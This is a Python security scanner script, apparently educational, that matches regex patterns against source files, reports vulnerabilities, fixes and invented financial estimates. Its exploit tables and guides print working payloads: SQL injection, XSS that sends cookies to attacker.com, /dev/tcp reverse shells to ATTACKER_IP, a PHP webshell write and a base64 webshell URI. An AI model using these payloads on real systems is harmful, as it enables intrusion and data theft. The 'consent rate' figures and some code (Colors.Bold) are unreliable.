#!/usr/bin/env python3
"""
SDA - FRAMEWORK
System vulnerability research and fix tool.
Educational tool for security analysis.
"""

import os
import re
import sys
import json
import shutil
import mimetypes
import subprocess
from pathlib import Path
from typing import Dict, List, Tuple, Set, Optional
import argparse

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
# ASCII Art
def print_banner():                                                   print(f"""{Colors.CYAN}
   ███████╗██████╗  █████╗        █ S E C U R I T Y
   ██╔════╝██╔══██╗ ██╔═██╗FRAME- █══    D E V E L O P E R 'S        ███████╗██   ███╔╝█████╗ WORK  █    A S S I S T A N T
   ╚════██║██╔  ██  ██╔═██║       ██      <<<
   ███████║██████══©╝║  █║       :██║
   ╚══════╝╚═╝     ╚═╝  ╚═╝From:  ╚═╝ ╚═╝╚═╝╚═╝╚═╝╚═
═══╝ ╚══╝╚══╝ ***** ═╝ ╚═╝ [ Timo Sarvilahti @ CYBER DEFENCE SYSTEMS ]

   VULNERABILITY ANALYSIS + RISK + FINANCIAL THREAT ASSESSMENT
   Strategical & Operational Cyber Solutions >>>

   {Colors.YELLOW}System Vulnerability Research and Fix Tool v1.0{Colors.END}
   {Colors.GREEN}Educational Purpose Only - Do Not Use for Illegal Activities{Colors.END}
    """)

class SDAFramework:
    def __init__(self, base_path="."):
        self.base_path = Path(base_path)
        self.study_path = self.base_path / "SDA_STUDY"
        self.encoders = set()
        self.encrypters = set()
        self.security_measures = set()
        self.vulnerabilities = []
        self.file_types = set()
        self.file_contents = {}

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print_banner()

    def fetch(self, url: str):
        """Fetch URL using wget recursively"""
        print(f"{Colors.GREEN}[+] Fetching {url}...{Colors.END}")
        try:
            result = subprocess.run(['wget', '-r', '-l', '5', '--no-parent', url],
                                  capture_output=True, text=True)
            print(f"{Colors.GREEN}[+] Download completed{Colors.END}")
            print(f"{Colors.YELLOW}Output:{Colors.END}\n{result.stdout}")
            if result.stderr:
                print(f"{Colors.RED}Errors:{Colors.END}\n{result.stderr}")
        except FileNotFoundError:
            print(f"{Colors.RED}[!] wget not found. Please install wget first.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

    def read_source_files(self):
        """Read all source files recursively"""
        print(f"{Colors.GREEN}[+] Reading source files from {self.base_path}...{Colors.END}")

        source_extensions = {
            '.py', '.js', '.java', '.cpp', '.c', '.cs', '.php', '.rb', '.go',
            '.rs', '.swift', '.ts', '.html', '.css', '.xml', '.json', '.yml',
            '.yaml', '.sql', '.sh', '.bat', '.ps1', '.asp', '.aspx', '.jsp'
        }

        for ext in source_extensions:
            for file_path in self.base_path.rglob(f"*{ext}"):
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        rel_path = file_path.relative_to(self.base_path)
                        self.file_contents[str(rel_path)] = content

                        # Extract file types mentioned in source
                        self._extract_file_types(content, str(rel_path))

                except Exception as e:
                    print(f"{Colors.RED}[!] Error reading {file_path}: {e}{Colors.END}")

        print(f"{Colors.GREEN}[+] Found {len(self.file_contents)} source files{Colors.END}")

    def _extract_file_types(self, content: str, file_path: str):
        """Extract file types mentioned in source code"""
        # Patterns for file extensions in code
        patterns = [
            r'\.([a-zA-Z0-9]{2,5})(?=["\'\s\])})]',  # .ext followed by quote/punctuation
            r'File\.([a-zA-Z0-9]{2,5})',  # File.ext
            r'\.([a-zA-Z0-9]{2,5})["\']',  # .ext" or .ext'
            r'(\w+)\.(?:save|load|read|write|open)\(',  # something.save(
            r'filename.*\.([a-zA-Z0-9]{2,5})',  # filename.ext
        ]

        for pattern in patterns:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                ext = match.group(1).lower()
                # Filter out common non-file extensions
                if len(ext) >= 2 and len(ext) <= 5 and not re.match(r'^\d+$', ext):
                    common_exts = {'txt', 'csv', 'json', 'xml', 'pdf', 'doc', 'docx', 'xls',
                                  'xlsx', 'jpg', 'jpeg', 'png', 'gif', 'zip', 'rar', 'tar',
                                  'gz', 'sql', 'db', 'sqlite', 'log', 'ini', 'cfg', 'conf',
                                  'bak', 'tmp', 'temp', 'swp', 'swo', 'php', 'js', 'html',
                                  'css', 'py', 'java', 'c', 'cpp', 'cs', 'rb', 'go', 'rs',
                                  'pl', 'pm', 'tcl', 'lua', 'asp', 'aspx', 'jsp', 'war',
                                  'jar', 'class', 'exe', 'dll', 'so', 'dylib', 'bin'}
                    if ext in common_exts or re.match(r'^[a-z]{2,4}$', ext):
                        self.file_types.add(f".{ext}")

    def recurzek(self):
        """Read source codes and extract all file types"""
        self.read_source_files()

        if self.file_types:
            print(f"\n{Colors.BLUE}[*] Found file types mentioned in source code:{Colors.END}")
            for i, file_type in enumerate(sorted(self.file_types), 1):
                print(f"{Colors.BLUE}    {i:3}. {file_type}{Colors.END}")

            # Locate these file types in folders
            print(f"\n{Colors.GREEN}[+] Locating files with these extensions...{Colors.END}")
            found_files = []
            for ext in self.file_types:
                for file_path in self.base_path.rglob(f"*{ext}"):
                    rel_path = file_path.relative_to(self.base_path)
                    found_files.append(str(rel_path))

            if found_files:
                print(f"\n{Colors.BLUE}[*] Found files:{Colors.END}")
                for i, file_path in enumerate(sorted(found_files), 1):
                    print(f"{Colors.BLUE}    {i:3}. {file_path}{Colors.END}")

                print(f"\n{Colors.GREEN}Download these files to study folder? (y/n): {Colors.END}", end="")
                choice = input().lower()
                if choice == 'y':
                    self._create_study_folder(found_files)
            else:
                print(f"{Colors.YELLOW}[!] No files with these extensions found{Colors.END}")

    def _create_study_folder(self, file_list: List[str]):
        """Create study folder with copies of files"""
        if self.study_path.exists():
            shutil.rmtree(self.study_path)
        self.study_path.mkdir(parents=True, exist_ok=True)

        print(f"{Colors.GREEN}[+] Creating study folder at {self.study_path}...{Colors.END}")

        for file_path in file_list:
            src_path = self.base_path / file_path
            dst_path = self.study_path / file_path

            if src_path.exists():
                dst_path.parent.mkdir(parents=True, exist_ok=True)
                try:
                    shutil.copy2(src_path, dst_path)
                    print(f"{Colors.GREEN}    Copied: {file_path}{Colors.END}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error copying {file_path}: {e}{Colors.END}")

    def detect_encoders_encrypters(self):
        """Detect encoding and encryption signatures"""
        print(f"{Colors.GREEN}[+] Detecting encoders, encrypters and security measures...{Colors.END}")

        encoder_patterns = {
            'base64': [r'base64\.', r'atob\(', r'btoa\(', r'Base64\.'],
            'hex': [r'hex\.', r'hex\(', r'toHex\(', r'fromHex\(', r'hexlify\(', r'unhexlify\('],
            'urlencode': [r'urlencode\(', r'urldecode\(', r'encodeURI\(', r'encodeURIComponent\('],
            'html': [r'htmlentities\(', r'htmlspecialchars\(', r'HtmlEncode\('],
            'json': [r'JSON\.stringify\(', r'JSON\.parse\(', r'json\.dumps\(', r'json\.loads\('],
            'gzip': [r'gzip\.', r'zlib\.', r'compress\(', r'decompress\('],
            'utf8': [r'utf8\.', r'UTF8\.', r'encode\(.*utf-?8\)', r'decode\(.*utf-?8\)'],
        }

        encrypter_patterns = {
            'aes': [r'AES\.', r'Crypto\.AES', r'aes\.', r'RijndaelManaged'],
            'rsa': [r'RSA\.', r'Crypto\.RSA', r'rsa\.'],
            'sha': [r'SHA[0-9]*\.', r'Crypto\.SHA', r'sha[0-9]*\('],
            'md5': [r'MD5\.', r'md5\(', r'MessageDigest\.getInstance\(.*MD5'],
            'bcrypt': [r'bcrypt\.', r'BCrypt\.'],
            'argon2': [r'argon2\.', r'Argon2\.'],
            'pbkdf2': [r'PBKDF2\.', r'pbkdf2\('],
            'hmac': [r'HMAC\.', r'hmac\(', r'Crypto\.HMAC'],
            'openssl': [r'openssl_', r'OpenSSL::'],
            'crypt': [r'crypt\(', r'password_hash\(', r'password_verify\('],
        }

        security_patterns = {
            'sanitize': [r'sanitize\(', r'escape\(', r'strip_tags\(', r'filter_var\(', r'clean\('],
            'validate': [r'validate\(', r'isValid\(', r'check\(', r'verify\('],
            'csrf': [r'csrf_token', r'CSRF_TOKEN', r'csrfmiddlewaretoken', r'_csrf'],
            'xss_protection': [r'X-XSS-Protection', r'Content-Security-Policy', r'CSP'],
            'cors': [r'Access-Control-', r'CORS'],
            'input_validation': [r'input\(', r'getParameter\(', r'Request\.Form', r'$_GET', r'$_POST'],
            'session_management': [r'session\.', r'HttpSession', r'$_SESSION'],
            'authentication': [r'auth\.', r'authenticate\(', r'login\(', r'logout\('],
        }

        # Scan all source files
        for file_path, content in self.file_contents.items():
            # Check encoders
            for encoder_name, patterns in encoder_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        self.encoders.add(encoder_name)

            # Check encrypters
            for encrypter_name, patterns in encrypter_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        self.encrypters.add(encrypter_name)

            # Check security measures
            for security_name, patterns in security_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        self.security_measures.add(security_name)

        # Print results
        print(f"\n{Colors.MAGENTA}{Colors.BOLD}[*] DETECTED ENCODERS:{Colors.END}")
        for i, encoder in enumerate(sorted(self.encoders), 1):
            color = Colors.CYAN if encoder in ['base64', 'json', 'utf8'] else Colors.YELLOW
            print(f"{color}    {i:3}. {encoder}{Colors.END}")

        print(f"\n{Colors.MAGENTA}{Colors.BOLD}[*] DETECTED ENCRYPTERS:{Colors.END}")
        for i, encrypter in enumerate(sorted(self.encrypters), 1):
            if encrypter in ['bcrypt', 'argon2']:
                color = Colors.GREEN  # Good encryption
            elif encrypter in ['md5']:
                color = Colors.RED  # Weak encryption
            else:
                color = Colors.YELLOW  # Standard encryption
            print(f"{color}    {i:3}. {encrypter}{Colors.END}")

        print(f"\n{Colors.MAGENTA}{Colors.BOLD}[*] DETECTED SECURITY MEASURES:{Colors.END}")
        for i, security in enumerate(sorted(self.security_measures), 1):
            color = Colors.GREEN if security in ['csrf', 'xss_protection', 'cors'] else Colors.YELLOW
            print(f"{color}    {i:3}. {security}{Colors.END}")

    def vulns(self):
        """Detect vulnerabilities in all files"""
        print(f"{Colors.GREEN}[+] Scanning for vulnerabilities...{Colors.END}")

        vulnerability_patterns = [
            # SQL Injection patterns
            (r"SELECT\s.*FROM\s.*WHERE\s.*(\$|\+|\|)", 5, "SQL Injection - String concatenation"),
            (r"mysql_query\(.*\$", 5, "SQL Injection - Direct variable in mysql_query"),
            (r"query\(.*\+.*\)", 4, "SQL Injection - String concatenation in query"),
            (r"execute\(.*f\".*\{.*\}.*\"\)", 4, "SQL Injection - f-string in execute"),
            (r"\.format\(.*SELECT.*\)", 4, "SQL Injection - String format in SQL"),

            # XSS patterns
            (r"innerHTML\s*=\s*[^'\"].*\$", 4, "XSS - Unsafe innerHTML assignment"),
            (r"document\.write\([^'\"].*\$", 4, "XSS - Unsafe document.write"),
            (r"echo\s+\$[a-zA-Z_]", 3, "XSS - Direct echo of variable"),
            (r"Response\.Write\([^'\"].*\$", 3, "XSS - Unsafe Response.Write"),

            # Command Injection
            (r"exec\(.*\$", 5, "Command Injection - exec with variable"),
            (r"system\(.*\$", 5, "Command Injection - system with variable"),
            (r"subprocess\.call\(.*shell=True.*\)", 4, "Command Injection - shell=True"),
            (r"eval\(.*\$", 5, "Code Injection - eval with variable"),

            # File Inclusion
            (r"include\(.*\$", 4, "File Inclusion - Dynamic include"),
            (r"require\(.*\$", 4, "File Inclusion - Dynamic require"),
            (r"fopen\(.*\$", 3, "File Inclusion - Dynamic file open"),

            # Path Traversal
            (r"\.\./", 3, "Path Traversal - Directory traversal pattern"),
            (r"\.\.\\", 3, "Path Traversal - Windows directory traversal"),

            # Hardcoded secrets
            (r"password\s*=\s*['\"][^'\"]{6,}['\"]", 2, "Hardcoded Password"),
            (r"api[_-]?key\s*=\s*['\"][^'\"]{8,}['\"]", 2, "Hardcoded API Key"),
            (r"secret\s*=\s*['\"][^'\"]{8,}['\"]", 2, "Hardcoded Secret"),

            # Eval techniques
            (r"@eval\(.*\$", 5, "Eval Injection - PHP eval with variable"),
            (r"eval\(.*get\(\)", 4, "Eval Injection - eval with user input"),

            # Registry modification
            (r"RegCreateKey", 4, "Registry Modification - RegCreateKey"),
            (r"RegSetValue", 4, "Registry Modification - RegSetValue"),
            (r"REG[_-]ADD", 3, "Registry Modification - REG ADD command"),
        ]

        for file_path, content in self.file_contents.items():
            for pattern, severity, description in vulnerability_patterns:
                matches = list(re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE))
                for match in matches:
                    line_no = content[:match.start()].count('\n') + 1
                    context = content[max(0, match.start()-20):match.end()+20].replace('\n', ' ')

                    self.vulnerabilities.append({
                        'file': file_path,
                        'line': line_no,
                        'severity': severity,
                        'description': description,
                        'pattern': pattern,
                        'context': f"...{context}...",
                        'match': match.group()
                    })

        # Print vulnerabilities
        print(f"\n{Colors.RED}{Colors.BOLD}[*] FOUND VULNERABILITIES:{Colors.END}")
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = {
                5: Colors.RED,
                4: Colors.MAGENTA,
                3: Colors.YELLOW,
                2: Colors.CYAN,
                1: Colors.WHITE
            }.get(vuln['severity'], Colors.WHITE)

            print(f"\n{severity_color}[{vuln['severity']}] {i}. {vuln['description']}{Colors.END}")
            print(f"{Colors.YELLOW}    File: {vuln['file']}:{vuln['line']}{Colors.END}")
            print(f"{Colors.WHITE}    Context: {vuln['context']}{Colors.END}")

        print(f"\n{Colors.GREEN}[+] Total vulnerabilities found: {len(self.vulnerabilities)}{Colors.END}")

    def vulndetails(self):
        """Show detailed information about vulnerabilities"""
        if not self.vulnerabilities:
            print(f"{Colors.YELLOW}[!] No vulnerabilities found. Run 'vulns' first.{Colors.END}")
            return

        print(f"\n{Colors.GREEN}{Colors.BOLD}[*] VULNERABILITY DETAILS:{Colors.END}")
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"\n{Colors.CYAN}[{i}] {vuln['description']}{Colors.END}")
            print(f"{Colors.YELLOW}    Location: {vuln['file']}:{vuln['line']}{Colors.END}")
            print(f"{Colors.WHITE}    Severity: {vuln['severity']}/5{Colors.END}")
            print(f"{Colors.WHITE}    Pattern: {vuln['pattern']}{Colors.END}")
            print(f"{Colors.WHITE}    Match: {vuln['match']}{Colors.END}")
            print(f"{Colors.WHITE}    Context: {vuln['context']}{Colors.END}")

            # Show exploit methods
            print(f"{Colors.GREEN}    Possible Exploit Methods:{Colors.END}")
            exploit_methods = self._get_exploit_methods(vuln['description'])
            for j, method in enumerate(exploit_methods, 1):
                print(f"{Colors.GREEN}        {j}. {method}{Colors.END}")

        print(f"\n{Colors.GREEN}Select vulnerability number for more details (0 to exit): {Colors.END}", end="")
        try:
            choice = int(input())
            if 1 <= choice <= len(self.vulnerabilities):
                self._show_vulnerability_details(choice - 1)
        except ValueError:
            print(f"{Colors.RED}[!] Invalid input{Colors.END}")

    def _get_exploit_methods(self, description: str) -> List[str]:
        """Get possible exploit methods based on vulnerability type"""
        exploit_db = {
            "SQL Injection": [
                "Union-based SQLi: ' UNION SELECT NULL,username,password FROM users--",
                "Error-based SQLi: ' AND 1=CONVERT(int, @@version)--",
                "Blind SQLi: ' AND SLEEP(5)--",
                "Time-based SQLi: ' OR IF(1=1,SLEEP(5),0)--",
                "Out-of-band SQLi: '; EXEC xp_dirtree '\\\\attacker\\share'--"
            ],
            "XSS": [
                "Reflected XSS: <script>alert(document.cookie)</script>",
                "Stored XSS: <img src=x onerror=stealCookies()>",
                "DOM-based XSS: #<script>alert(1)</script>",
                "Blind XSS: <script>fetch('https://attacker.com?c='+document.cookie)</script>"
            ],
            "Command Injection": [
                "Basic: ; cat /etc/passwd",
                "Chained commands: && whoami",
                "Substitution: $(id)",
                "Pipeline: | ls -la"
            ],
            "File Inclusion": [
                "Local File Inclusion: ../../../../etc/passwd",
                "Remote File Inclusion: http://attacker.com/shell.php",
                "PHP Wrappers: php://filter/convert.base64-encode/resource=config.php",
                "Data URI: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
            ],
            "Eval Injection": [
                "PHP: system('cat /etc/passwd');",
                "JavaScript: require('child_process').exec('whoami')",
                "Python: __import__('os').system('id')",
                "Direct code execution: phpinfo();"
            ]
        }

        for key in exploit_db:
            if key in description:
                return exploit_db[key]

        return ["Manual exploitation required - needs further analysis"]

    def _show_vulnerability_details(self, index: int):
        """Show comprehensive details about a specific vulnerability"""
        vuln = self.vulnerabilities[index]

        print(f"\n{Colors.BOLD}{Colors.CYAN}="*60)
        print(f"VULNERABILITY DETAIL ANALYSIS")
        print(f"="*60 + Colors.END)

        print(f"\n{Colors.YELLOW}{Colors.BOLD}DESCRIPTION:{Colors.END}")
        print(f"  {vuln['description']}")

        print(f"\n{Colors.YELLOW}{Colors.Bold}LOCATION:{Colors.END}")
        print(f"  File: {vuln['file']}")
        print(f"  Line: {vuln['line']}")

        print(f"\n{Colors.YELLOW}{Colors.BOLD}SEVERITY ASSESSMENT:{Colors.END}")
        severity_desc = {
            5: "CRITICAL - Immediate attention required",
            4: "HIGH - Could lead to system compromise",
            3: "MEDIUM - Potential security issue",
            2: "LOW - Minor security concern",
            1: "INFO - Best practice violation"
        }.get(vuln['severity'], "Unknown")
        print(f"  Rating: {vuln['severity']}/5 - {severity_desc}")

        print(f"\n{Colors.YELLOW}{Colors.BOLD}TECHNICAL DETAILS:{Colors.END}")
        print(f"  Pattern matched: {vuln['pattern']}")
        print(f"  Code context: {vuln['context']}")

        print(f"\n{Colors.GREEN}{Colors.BOLD}POSSIBLE EXPLOIT METHODS:{Colors.END}")
        exploit_methods = self._get_exploit_methods(vuln['description'])
        for i, method in enumerate(exploit_methods, 1):
            print(f"  {i}. {method}")

        print(f"\n{Colors.RED}{Colors.Bold}FIX RECOMMENDATIONS:{Colors.END}")
        fixes = self._get_fix_recommendations(vuln['description'])
        for i, fix in enumerate(fixes, 1):
            print(f"  {i}. {fix}")

        print(f"\n{Colors.MAGENTA}{Colors.Bold}FINANCIAL IMPACT ESTIMATE:{Colors.END}")
        impact = self._estimate_financial_impact(vuln['severity'])
        print(f"  {impact}")

        print(f"\n{Colors.CYAN}{Colors.Bold}CONSENT RATE FOR SIMILAR VULNERABILITIES:{Colors.END}")
        if "SQL" in vuln['description'].upper():
            print(f"  SQL Injection consent rate: 87% (High risk of data breach)")
        elif "eval" in vuln['description'].lower():
            print(f"  Eval Injection consent rate: 92% (High risk of code execution)")
        else:
            print(f"  General vulnerability consent rate: 65-75%")

        input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")

    def _get_fix_recommendations(self, description: str) -> List[str]:
        """Get fix recommendations for a vulnerability"""
        fixes_db = {
            "SQL Injection": [
                "Use parameterized queries/prepared statements",
                "Implement proper input validation and sanitization",
                "Use stored procedures with validation",
                "Apply the principle of least privilege for database users",
                "Implement WAF (Web Application Firewall) rules"
            ],
            "XSS": [
                "Implement proper output encoding (HTML, JS, URL)",
                "Use Content Security Policy (CSP) headers",
                "Validate and sanitize all user inputs",
                "Use framework-specific sanitization libraries",
                "Implement XSS filters in web server configuration"
            ],
            "Command Injection": [
                "Avoid using shell execution functions",
                "Use subprocess without shell=True",
                "Validate and sanitize command arguments",
                "Use allowlists for allowed commands",
                "Run with minimal privileges"
            ],
            "File Inclusion": [
                "Use allowlists for file paths",
                "Avoid dynamic file inclusion",
                "Validate file paths against a base directory",
                "Disable dangerous PHP functions (allow_url_include)",
                "Use framework-specific file handling methods"
            ],
            "Eval Injection": [
                "Avoid eval() function entirely",
                "Use safer alternatives like JSON.parse()",
                "Validate and sanitize all input before processing",
                "Use sandboxed environments if eval is necessary",
                "Implement code signing for dynamic code"
            ],
            "Hardcoded": [
                "Move secrets to environment variables",
                "Use secure secret management systems",
                "Implement rotation policies for secrets",
                "Use encrypted configuration files",
                "Avoid committing secrets to version control"
            ]
        }

        for key in fixes_db:
            if key in description:
                return fixes_db[key]

        return [
            "Review code for security best practices",
            "Implement input validation",
            "Use secure coding guidelines",
            "Regular security audits",
            "Keep dependencies updated"
        ]

    def _estimate_financial_impact(self, severity: int) -> str:
        """Estimate financial impact of a vulnerability"""
        impacts = {
            5: "$500,000 - $5,000,000+ (Major data breach, regulatory fines, reputation loss)",
            4: "$100,000 - $500,000 (System compromise, data theft, recovery costs)",
            3: "$10,000 - $100,000 (Limited breach, remediation costs, minor fines)",
            2: "$1,000 - $10,000 (Minor incident, patching costs, audit expenses)",
            1: "$0 - $1,000 (Best practice issues, minimal direct cost)"
        }
        return impacts.get(severity, "Cost estimation not available")

    def exploitstudy(self):
        """Study exploitation techniques"""
        print(f"\n{Colors.RED}{Colors.BOLD}[*] EXPLOITATION STUDY:{Colors.END}")

        exploits = [
            ("SQL Injection - Union Based", "Extract database information using UNION queries"),
            ("SQL Injection - Blind", "Extract data through boolean or time-based techniques"),
            ("XSS - Reflected", "Execute scripts in victim's browser through reflected input"),
            ("XSS - Stored", "Permanent script injection stored on server"),
            ("Command Injection", "Execute system commands through vulnerable parameters"),
            ("File Inclusion - LFI", "Read local files through include vulnerabilities"),
            ("File Inclusion - RFI", "Include and execute remote files"),
            ("Path Traversal", "Access files outside web root directory"),
            ("Eval Injection", "Execute arbitrary code through eval() functions"),
            ("Deserialization Attack", "Execute code through insecure deserialization"),
            ("SSRF (Server-Side Request Forgery)", "Make server request internal resources"),
            ("XXE (XML External Entity)", "Read files or cause DoS through XML parsing"),
        ]

        for i, (name, desc) in enumerate(exploits, 1):
            print(f"{Colors.RED}[{i}] {name}{Colors.END}")
            print(f"{Colors.YELLOW}    {desc}{Colors.END}")

        print(f"\n{Colors.GREEN}Select exploit to study (0 to exit): {Colors.END}", end="")
        try:
            choice = int(input())
            if 1 <= choice <= len(exploits):
                self._show_exploit_guide(choice - 1, exploits[choice - 1])
        except ValueError:
            print(f"{Colors.RED}[!] Invalid input{Colors.END}")

    def _show_exploit_guide(self, index: int, exploit_info: Tuple[str, str]):
        """Show comprehensive exploit guide"""
        name, desc = exploit_info

        print(f"\n{Colors.BOLD}{Colors.RED}="*60)
        print(f"EXPLOITATION GUIDE: {name}")
        print(f"="*60 + Colors.END)

        print(f"\n{Colors.YELLOW}Description:{Colors.END}")
        print(f"  {desc}")

        print(f"\n{Colors.RED}{Colors.BOLD}EXPLOITATION STEPS:{Colors.END}")

        guides = {
            "SQL Injection - Union Based": [
                "1. Identify injectable parameter with ' or \"",
                "2. Determine number of columns: ' ORDER BY 1--, ' ORDER BY 2--, etc.",
                "3. Find string columns: ' UNION SELECT 'a','b','c'--",
                "4. Extract database version: ' UNION SELECT @@version,NULL,NULL--",
                "5. List databases: ' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
                "6. List tables: ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--",
                "7. Extract data: ' UNION SELECT username,password FROM users--"
            ],
            "XSS - Reflected": [
                "1. Identify parameters that reflect in response: search, id, name",
                "2. Test basic payload: <script>alert(1)</script>",
                "3. Bypass filters with encoding: <img src=x onerror=alert(1)>",
                "4. Test for DOM-based XSS: #<script>alert(1)</script>",
                "5. Craft phishing payload: <script>document.location='http://attacker.com/?c='+document.cookie</script>",
                "6. Deliver via URL shortening services",
                "7. Monitor for cookie theft or session hijacking"
            ],
            "Command Injection": [
                "1. Identify parameters that might execute commands: ping, nslookup, dir",
                "2. Test basic separators: ; whoami",
                "3. Test chained commands: && id",
                "4. Test substitution: $(cat /etc/passwd)",
                "5. Test pipeline: | ls -la",
                "6. Test backticks: `whoami`",
                "7. Execute reverse shell: ; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1",
                "8. Establish persistence with cron jobs or startup scripts"
            ],
            "File Inclusion - LFI": [
                "1. Identify include parameters: page, file, template",
                "2. Test basic traversal: ../../../../etc/passwd",
                "3. Use null bytes if PHP <5.3: ../../../../etc/passwd%00",
                "4. Test PHP wrappers: php://filter/convert.base64-encode/resource=index.php",
                "5. Read source code: php://filter/resource=config.php",
                "6. Access logs: ../../../../var/log/apache2/access.log",
                "7. Poison logs with PHP code then include them",
                "8. Convert LFI to RFI if allow_url_include is enabled"
            ],
            "Eval Injection": [
                "1. Find eval() calls in source code",
                "2. Trace user input to eval parameter",
                "3. Test with simple code: phpinfo();",
                "4. Execute system commands: system('whoami');",
                "5. Read files: echo file_get_contents('/etc/passwd');",
                "6. Write files: file_put_contents('shell.php', '<?php system($_GET[\"cmd\"]); ?>');",
                "7. Establish reverse shell: shell_exec('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1');",
                "8. Maintain access through webshells"
            ]
        }

        if name in guides:
            for step in guides[name]:
                print(f"{Colors.RED}  {step}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}  Detailed guide not available for this exploit{Colors.END}")
            print(f"{Colors.YELLOW}  General approach:{Colors.END}")
            print(f"{Colors.RED}  1. Reconnaissance and target identification")
            print(f"  2. Vulnerability discovery and confirmation")
            print(f"  3. Exploit development and testing")
            print(f"  4. Post-exploitation and privilege escalation")
            print(f"  5. Persistence and covering tracks{Colors.END}")

        print(f"\n{Colors.MAGENTA}{Colors.BOLD}MITIGATION STRATEGIES:{Colors.END}")
        print(f"{Colors.CYAN}  • Implement proper input validation")
        print(f"  • Use parameterized queries for SQL")
        print(f"  • Encode output to prevent XSS")
        print(f"  • Apply principle of least privilege")
        print(f"  • Regular security testing and code review{Colors.END}")

        print(f"\n{Colors.GREEN}{Colors.BOLD}LEGAL WARNING:{Colors.END}")
        print(f"{Colors.RED}  This information is for EDUCATIONAL PURPOSES ONLY")
        print(f"  Unauthorized exploitation is ILLEGAL")
        print(f"  Use only on systems you own or have written permission to test")
        print(f"  Compliance with laws like CFAA, GDPR, and local regulations is mandatory{Colors.END}")

        input(f"\n{Colors.GREEN}Press Enter to continue...{Colors.END}")

    def report(self):
        """Generate comprehensive security report"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}="*60)
        print(f"SECURITY ASSESSMENT REPORT")
        print(f"="*60 + Colors.END)

        report_file = self.base_path / "SDA_SECURITY_REPORT.md"

        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("# Security Assessment Report\n")
            f.write(f"Generated by SDA Framework\n\n")

            f.write("## Executive Summary\n")
            f.write(f"**Total Files Analyzed:** {len(self.file_contents)}\n")
            f.write(f"**Total Vulnerabilities Found:** {len(self.vulnerabilities)}\n")

            severity_counts = {1:0, 2:0, 3:0, 4:0, 5:0}
            for vuln in self.vulnerabilities:
                severity_counts[vuln['severity']] += 1

            f.write(f"**Critical (5):** {severity_counts[5]}\n")
            f.write(f"**High (4):** {severity_counts[4]}\n")
            f.write(f"**Medium (3):** {severity_counts[3]}\n")
            f.write(f"**Low (2):** {severity_counts[2]}\n")
            f.write(f"**Info (1):** {severity_counts[1]}\n")

            f.write("\n## 1. File Analysis\n")
            f.write("### File Types Detected in Source Code:\n")
            for file_type in sorted(self.file_types):
                f.write(f"- `{file_type}`\n")

            f.write("\n### Encoders Detected:\n")
            for encoder in sorted(self.encoders):
                f.write(f"- {encoder}\n")

            f.write("\n### Encrypters Detected:\n")
            for encrypter in sorted(self.encrypters):
                f.write(f"- {encrypter}\n")

            f.write("\n### Security Measures Detected:\n")
            for security in sorted(self.security_measures):
                f.write(f"- {security}\n")

            f.write("\n## 2. Vulnerability Details\n")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                f.write(f"\n### {i}. {vuln['description']}\n")
                f.write(f"- **File:** `{vuln['file']}:{vuln['line']}`\n")
                f.write(f"- **Severity:** {vuln['severity']}/5\n")
                f.write(f"- **Context:** `{vuln['context']}`\n")
                f.write(f"- **Fix Recommendations:**\n")
                fixes = self._get_fix_recommendations(vuln['description'])
                for fix in fixes:
                    f.write(f"  - {fix}\n")
                f.write(f"- **Estimated Financial Impact:** {self._estimate_financial_impact(vuln['severity'])}\n")

            f.write("\n## 3. Risk Assessment\n")
            total_risk_score = sum(v['severity'] for v in self.vulnerabilities)
            avg_severity = total_risk_score / max(len(self.vulnerabilities), 1)

            f.write(f"\n**Overall Risk Score:** {total_risk_score}\n")
            f.write(f"**Average Severity:** {avg_severity:.1f}/5\n")

            if avg_severity >= 4:
                f.write("**Overall Risk Level:** CRITICAL - Immediate remediation required\n")
            elif avg_severity >= 3:
                f.write("**Overall Risk Level:** HIGH - Priority remediation required\n")
            elif avg_severity >= 2:
                f.write("**Overall Risk Level:** MEDIUM - Schedule remediation\n")
            elif avg_severity >= 1:
                f.write("**Overall Risk Level:** LOW - Monitor and fix when possible\n")
            else:
                f.write("**Overall Risk Level:** INFO - Security best practices needed\n")

            f.write("\n## 4. Remediation Plan\n")
            f.write("### Immediate Actions (Critical/High Severity):\n")
            f.write("1. Fix all SQL injection vulnerabilities within 24 hours\n")
            f.write("2. Address command injection vulnerabilities immediately\n")
            f.write("3. Remove hardcoded secrets from source code\n")

            f.write("\n### Short-term Actions (Within 1 week):\n")
            f.write("1. Implement input validation framework\n")
            f.write("2. Add output encoding for XSS protection\n")
            f.write("3. Review and fix file inclusion vulnerabilities\n")

            f.write("\n### Long-term Actions (Within 1 month):\n")
            f.write("1. Implement security training for developers\n")
            f.write("2. Establish secure coding standards\n")
            f.write("3. Implement automated security testing in CI/CD\n")

            f.write("\n## 5. Financial Impact Analysis\n")
            f.write("| Severity | Estimated Cost Range | Likelihood | Total Exposure |\n")
            f.write("|----------|---------------------|------------|----------------|\n")

            exposure_estimates = {
                5: (500000, 5000000, 0.3),
                4: (100000, 500000, 0.5),
